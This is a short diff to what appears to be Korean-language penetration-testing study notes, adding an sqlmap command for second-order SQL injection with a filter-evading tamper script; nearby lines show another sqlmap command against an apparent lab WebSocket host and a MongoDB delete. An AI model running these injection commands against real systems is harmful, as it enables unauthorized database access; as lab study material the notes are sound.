@@ -647,6 +647,8 @@ db.users.deleteOne({name: "test"})
 - `HTTPS` 전달시 `--force-ssl`사용
 ```bash
 sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"1234"}'
+
+sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment
 ```
   
 </details>
